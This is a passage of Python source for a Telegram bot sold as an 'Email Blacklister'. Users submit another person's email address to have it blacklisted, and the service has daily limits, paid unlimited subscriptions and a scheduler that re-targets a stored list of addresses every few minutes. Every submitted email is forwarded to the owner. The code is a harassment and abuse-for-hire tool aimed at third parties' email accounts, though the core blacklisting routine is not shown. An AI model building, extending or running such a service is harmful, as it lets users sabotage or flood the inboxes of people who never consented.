                await query.edit_message_text("⛔ Only admins!")
                return
            auto_emails_list.clear()
            save_auto_emails()
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text("🗑️ CLEARED!", reply_markup=reply_markup)

        elif data == 'broadcast':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            await query.edit_message_text(f"📢 BROADCAST\n\nUsage: /broadcast <message>\n\nUsers: {len(users_list)}")

        elif data == 'users':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            if not users_list:
                await query.edit_message_text("📊 No users.")
                return
            user_text = "\n".join([
                f"• {u['name']} (@{u['username']}) - today: {u.get('daily_count', 0)}/{MAX_BLACKLIST_LIMIT} | total: {u.get('blacklist_count', 0)}"
                for u in users_list[-10:]
            ])
            await query.edit_message_text(f"📊 USERS ({len(users_list)})\n\n{user_text}")

        elif data == 'ban':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            await query.edit_message_text("🚫 /ban <user_id>")

        elif data == 'unban':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            await query.edit_message_text("✅ /unban <user_id>")

        elif data == 'bannedlist':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            if not banned_users_list:
                await query.edit_message_text("📋 No banned users.")
                return
            banned_text = "\n".join([f"• ID: {uid}" for uid in banned_users_list])
            await query.edit_message_text(f"📋 BANNED ({len(banned_users_list)})\n\n{banned_text}")

        elif data == 'sublist':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            if not subscribers_list:
                await query.edit_message_text("💎 No subscribers.")
                return
            subs_text = "\n".join([f"• ID: {sid}" for sid in subscribers_list])
            await query.edit_message_text(f"💎 SUBSCRIBERS ({len(subscribers_list)})\n\n{subs_text}")

        elif data == 'help':
            help_text = f"""📖 HELP

1️⃣ Click BLACKLIST NOW
2️⃣ Enter Email
3️⃣ Wait
4️⃣ Get Result

Daily Limit: {MAX_BLACKLIST_LIMIT} per user per day
🕛 Resets at 12:00 AM IST
Failed attempts don't count

💎 Unlimited: {OWNER_USERNAME}

Auto Blacklist: Every {AUTO_INTERVAL_MINUTES} min

Owner: {OWNER_USERNAME}"""
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(help_text, reply_markup=reply_markup)

        elif data == 'owner':
            owner_text = f"""👑 OWNER

{OWNER_USERNAME}

Services:
🔥 Email Blacklisting
⏰ Auto Blacklist (Every {AUTO_INTERVAL_MINUTES} min)
💎 Unlimited Subscription
⚡ Fast Processing

24/7 Support"""
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(owner_text, reply_markup=reply_markup)

        elif data == 'status':
            total_users = len(users_list)
            total_blacklists = sum(u.get('blacklist_count', 0) for u in users_list)
            status_text = f"""📊 BOT STATUS

Status: 🟢 ONLINE
Workers: {NUM_WORKERS}
Users: {total_users}
Total Blacklists: {total_blacklists}
Daily Limit: {MAX_BLACKLIST_LIMIT}/user
Auto List: {len(auto_emails_list)} emails
Auto Interval: Every {AUTO_INTERVAL_MINUTES} min
Total Auto Attempts: {total_attempts_ever}
Banned: {len(banned_users_list)}
Subscribers: {len(subscribers_list)} 💎
Admins: {len(admins_list) + 1}

Owner: {OWNER_USERNAME}"""
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(status_text, reply_markup=reply_markup)

        elif data == 'check_join':
            is_member = await check_channel_membership(context, user_id)
            if is_member:
                reply_markup = get_main_menu_keyboard(user_id)
                await query.edit_message_text("✅ VERIFIED!\n\nChoose an option:", reply_markup=reply_markup)
            else:
                keyboard = [
                    [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.edit_message_text(f"❌ NOT VERIFIED!\n\nJoin: @Adityaapis_570", reply_markup=reply_markup)

        elif data == 'cancel':
            user_states[user_id] = "idle"
            reply_markup = get_main_menu_keyboard(user_id)
            await query.edit_message_text("✅ CANCELLED", reply_markup=reply_markup)

        elif data == 'back':
            reply_markup = get_main_menu_keyboard(user_id)
            await query.edit_message_text("✨ MAIN MENU ✨\n\nChoose:", reply_markup=reply_markup)

        elif data == 'broadcast_yes' or data == 'broadcast_no':
            await broadcast_callback(update, context)

    except Exception as e:
        print(f"{R}[!] Error in button_callback: {e}{S}", flush=True)


# ==================== MESSAGE ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            return
        user_id = user.id
        if is_user_banned(user_id):
            await update.message.reply_text("🚫 YOU ARE BANNED!")
            return
        message_text = update.message.text.strip()
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message(update, context)
                return

        if user_states.get(user_id) == "awaiting_setlimit" and user_id == OWNER_ID:
            try:
                new_limit = int(message_text.strip())
            except ValueError:
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
                await update.message.reply_text("❌ Invalid number! Send a whole number (e.g. 2).", reply_markup=reply_markup)
                return
            success, msg = set_max_limit(new_limit)
            user_states[user_id] = "idle"
            reply_markup = get_main_menu_keyboard(user_id)
            if success:
                await update.message.reply_text(f"✅ UPDATED\n\n{msg}\n\nℹ️ Resets daily at 12:00 AM IST.", reply_markup=reply_markup)
            else:
                await update.message.reply_text(f"❌ {msg}", reply_markup=reply_markup)
            return

        if user_states.get(user_id) == "awaiting_remove_email" and is_admin(user_id):
            emails = [e.strip() for e in message_text.split(',')]
            removed = []
            not_found = []
            for email in emails:
                if email in auto_emails_list:
                    auto_emails_list.remove(email)
                    removed.append(email)
                else:
                    not_found.append(email)
            save_auto_emails()
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            response = f"❌ REMOVED\n\nRemoved: {len(removed)}\nNot Found: {len(not_found)}\nTotal: {len(auto_emails_list)}"
            if removed:
                response += "\n\n" + "\n".join(["• " + e for e in removed])
            user_states[user_id] = "idle"
            await update.message.reply_text(response, reply_markup=reply_markup)
            return

        if user_states.get(user_id) == "awaiting_auto_email" and is_admin(user_id):
            emails = [e.strip() for e in message_text.split(',')]
            valid = []
            invalid = []
            for email in emails:
                if '@' in email and '.' in email:
                    if email not in auto_emails_list:
                        auto_emails_list.append(email)
                        valid.append(email)
                    else:
                        invalid.append(f"{email} (exists)")
                else:
                    invalid.append(f"{email} (invalid)")
            save_auto_emails()
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            response = f"✅ AUTO UPDATED\n\nAdded: {len(valid)}\nFailed: {len(invalid)}\nTotal: {len(auto_emails_list)}\nInterval: Every {AUTO_INTERVAL_MINUTES} min"
            if valid:
                response += "\n\n" + "\n".join(["• " + e for e in valid])
            user_states[user_id] = "idle"
            await update.message.reply_text(response, reply_markup=reply_markup)
            return

        if user_states.get(user_id) == "awaiting_email":
            if '@' in message_text and '.' in message_text:
                if not has_unlimited_access(user_id):
                    count = get_user_blacklist_count(user_id)
                    if count >= MAX_BLACKLIST_LIMIT:
                        reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🏠 MAIN MENU", callback_data='back')]])
                        await update.message.reply_text(
                            f"❌ DAILY LIMIT REACHED\n\nToday: {count}/{MAX_BLACKLIST_LIMIT}\n\n"
                            f"🕛 Resets at 12:00 AM IST\n\n💎 Unlimited? {OWNER_USERNAME}",
                            reply_markup=reply_markup
                        )
                        user_states[user_id] = "idle"
                        return
                await notify_owner_email(context, user, message_text)
                processing_msg = await update.message.reply_text(f"⏳ PROCESSING...\n\nEmail: {message_text}")
                try:
                    success, result = await asyncio.to_thread(blacklist_email, message_text)
                    if success:
                        if not has_unlimited_access(user_id):
                            increment_blacklist_count(user_id)
                        reply_markup = get_main_menu_keyboard(user_id)
                        if is_admin(user_id):
                            access_note = "🛡️ Admin - Unlimited"
                        elif is_subscribed(user_id):
                            access_note = "💎 Subscribed - Unlimited"
                        else:
                            count = get_user_blacklist_count(user_id)
                            remaining = MAX_BLACKLIST_LIMIT - count
                            if remaining < 0:
                                remaining = 0
                            access_note = (f"Today: {count}/{MAX_BLACKLIST_LIMIT}\n"
                                           f"Remaining today: {remaining}\n"
                                           f"🕛 Resets at 12:00 AM IST")
                        await processing_msg.edit_text(
                            f"🎉 SUCCESS!\n\n✅ BLACKLISTED!\n\nEmail: {message_text}\nStatus: {result}\n\n{access_note}",
                            reply_markup=reply_markup
                        )
                    else:
                        reply_markup = get_main_menu_keyboard(user_id)
                        if is_admin(user_id):
                            access_note = "🛡️ Admin"
                        elif is_subscribed(user_id):
                            access_note = "💎 Unlimited"
                        else:
                            count = get_user_blacklist_count(user_id)
                            access_note = f"Today: {count}/{MAX_BLACKLIST_LIMIT}"
                        await processing_msg.edit_text(
                            f"❌ FAILED\n\nEmail: {message_text}\nStatus: {result}\n\n{access_note}",
                            reply_markup=reply_markup
                        )
                    user_states[user_id] = "idle"
                except Exception as e:
                    print(f"{R}[!] Blacklist error: {e}{S}", flush=True)
                    reply_markup = get_main_menu_keyboard(user_id)
                    await processing_msg.edit_text(f"⚠️ ERROR\n\nContact: {OWNER_USERNAME}", reply_markup=reply_markup)
                    user_states[user_id] = "idle"
            else:
                reply_markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 TRY AGAIN", callback_data='blacklist')],
                    [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
                ])
                await update.message.reply_text("❌ INVALID EMAIL\n\nExample: user@domain.com", reply_markup=reply_markup)
        else:
            reply_markup = get_main_menu_keyboard(user_id)
            await update.message.reply_text(
                f"✨ EMAIL BLACKLISTER ✨\n\nWelcome {user.full_name if user.full_name else 'User'}!",
                reply_markup=reply_markup
            )
    except Exception as e:
        print(f"{R}[!] Error in handle_message: {e}{S}", flush=True)


# ==================== HELPERS ====================
async def check_channel_membership(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    try:
        chat_member = await context.bot.get_chat_member(chat_id=FORCE_CHANNEL_USERNAME, user_id=user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"{R}[!] Channel check error: {e}{S}", flush=True)
        return False


async def send_force_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🔒 CHANNEL REQUIRED\n\nJoin: @Adityaapis_570", reply_markup=reply_markup)


async def send_force_channel_message_update(query):
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("🔒 CHANNEL REQUIRED\n\nJoin: @Adityaapis_570", reply_markup=reply_markup)


async def notify_owner_new_user(context: ContextTypes.DEFAULT_TYPE, user):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        if is_new_user(user.id):
            try:
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"🌟 NEW USER\n\nUser: {user.full_name}\nUsername: @{user.username}\nID: {user.id}"
                )
            except Exception as e:
                print(f"{R}[!] Notify owner error: {e}{S}", flush=True)


async def notify_owner_email(context: ContextTypes.DEFAULT_TYPE, user, email):
    if user is None:
        return
    if OWNER_ID and user.id != OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"📧 EMAIL SUBMITTED\n\nUser: {user.full_name}\nEmail: {email}"
            )
        except Exception as e:
            print(f"{R}[!] Notify error: {e}{S}", flush=True)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    user_id = user.id
    user_states[user_id] = "idle"
    reply_markup = get_main_menu_keyboard(user_id)
    await update.message.reply_text("✅ CANCELLED", reply_markup=reply_markup)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = len(users_list)
    total_blacklists = sum(u.get('blacklist_count', 0) for u in users_list)
    reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
    await update.message.reply_text(
        f"""📊 BOT STATUS

Status: 🟢 ONLINE
Workers: {NUM_WORKERS}
Users: {total_users}
Blacklists: {total_blacklists}
Daily Limit: {MAX_BLACKLIST_LIMIT}/user
Auto List: {len(auto_emails_list)}
Auto Interval: Every {AUTO_INTERVAL_MINUTES} min
Total Attempts: {total_attempts_ever}
Banned: {len(banned_users_list)}
Subscribers: {len(subscribers_list)}

Owner: {OWNER_USERNAME}""",
        reply_markup=reply_markup
    )


# ==================== SCHEDULER ====================
def _schedule_auto_blacklist_thread(application):
    def check_and_run():
        print(f"{G}[+] Thread scheduler: every {AUTO_INTERVAL_MINUTES} min{S}", flush=True)
        time.sleep(30)
        while True:
            try:
                print(f"{G}[+] Running auto blacklist (thread)...{S}", flush=True)
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    class FakeContext:
                        def __init__(self, bot):
                            self.bot = bot
                    ctx = FakeContext(application.bot)
                    loop.run_until_complete(auto_blacklist_job(ctx))
                except Exception as e:
                    print(f"{R}[!] Auto error: {e}{S}", flush=True)
                finally:
                    loop.close()
                print(f"{G}[+] Next auto in {AUTO_INTERVAL_MINUTES} min{S}", flush=True)
                time.sleep(AUTO_INTERVAL_SECONDS)
            except Exception as e:
                print(f"{R}[!] Scheduler error: {e}{S}", flush=True)
                time.sleep(60)
    thread = threading.Thread(target=check_and_run, daemon=True)
    thread.start()
    print(f"{G}[+] Thread scheduler started{S}", flush=True)


def schedule_auto_blacklist(application):
    try:
        if application.job_queue is None:
            raise Exception("job_queue is None")
        application.job_queue.run_repeating(
            auto_blacklist_job,
            interval=AUTO_INTERVAL_SECONDS,
            first=30,
            name="auto_blacklist_repeating"
        )
        print(f"{G}[+] Auto blacklist scheduled EVERY {AUTO_INTERVAL_MINUTES} MINUTES{S}", flush=True)
    except Exception as e:
        print(f"{R}[!] job_queue failed: {e}{S}", flush=True)
        print(f"{Y}[!] Falling back to thread-based scheduler{S}", flush=True)
        _schedule_auto_blacklist_thread(application)


# ==================== BOT RUNNER ====================
def run_bot():
    try:
        print(f"{G}[+] Loading data...{S}", flush=True)
        load_settings()
        load_auto_emails()
        load_users()
        load_admins()
        load_banned_users()
        load_subscribers()

        print(f"{G}[+] Building application...{S}", flush=True)

        request = HTTPXRequest(
            connection_pool_size=8,
            connect_timeout=60.0,
            read_timeout=60.0,
            write_timeout=60.0,
            pool_timeout=60.0
        )

        application = Application.builder().token(BOT_TOKEN).request(request).build()

        print(f"{G}[+] Adding handlers...{S}", flush=True)
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("cancel", cancel_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("broadcast", broadcast_command))
        application.add_handler(CommandHandler("ban", ban_command))
        application.add_handler(CommandHandler("unban", unban_command))
        application.add_handler(CommandHandler("bannedlist", banned_list_command))
        application.add_handler(CommandHandler("subscribe", subscribe_command))
        application.add_handler(CommandHandler("unsubscribe", unsubscribe_command))
        application.add_handler(CommandHandler("checksub", checksub_command))
        application.add_handler(CommandHandler("sublist", sublist_command))
        application.add_handler(CommandHandler("setlimit", setlimit_command))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        schedule_auto_blacklist(application)

        print(f"{G}[+] Bot is ready!{S}", flush=True)
        print(f"""
{G}╔═══════════════════════════════════════╗{S}
{G}║     ✨🌟 BOT STARTED 🌟✨           ║{S}
{G}╠═══════════════════════════════════════╣{S}
{G}║  🤖 Status: 🟢 ONLINE                 ║{S}
{G}║  👑 Owner: {OWNER_USERNAME}           ║{S}
{G}║  ⚡ Workers: {NUM_WORKERS}            ║{S}
{G}║  ⏰ Auto: Every {AUTO_INTERVAL_MINUTES} min        ║{S}
{G}║  📧 Auto List: {len(auto_emails_list)} emails       ║{S}
{G}║  👥 Users: {len(users_list)}          ║{S}
{G}║  📊 Daily Limit: {MAX_BLACKLIST_LIMIT}              ║{S}
{G}╚═══════════════════════════════════════╝{S}
""", flush=True)

        try:
            application.run_polling(drop_pending_updates=True)
        except Conflict as e:
            print(f"{R}[!] Conflict Error: {e}{S}", flush=True)
            print(f"{Y}[!] Another bot instance running!{S}", flush=True)
        except Exception as e:
            print(f"{R}[!] Error: {e}{S}", flush=True)
    except Exception as e:
        print(f"{R}[!] Bot error: {e}{S}", flush=True)
        import traceback
        traceback.print_exc()


# ==================== MAIN ====================
def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print(f"{R}[!] BOT_TOKEN missing or invalid!{S}", flush=True)
        sys.exit(1)
    if not OWNER_ID:
        print(f"{R}[!] OWNER_ID missing!{S}", flush=True)
        sys.exit(1)

    # Start Flask health server in a background thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print(f"{G}[+] Flask health server started on port {PORT}{S}", flush=True)

    # Small delay so Flask binds first
    time.sleep(2)

    # Run bot in main thread (blocking)
    run_bot()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Bot stopped by user{S}", flush=True)
        sys.exit()
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{S}", flush=True)
        import traceback
        traceback.print_exc()
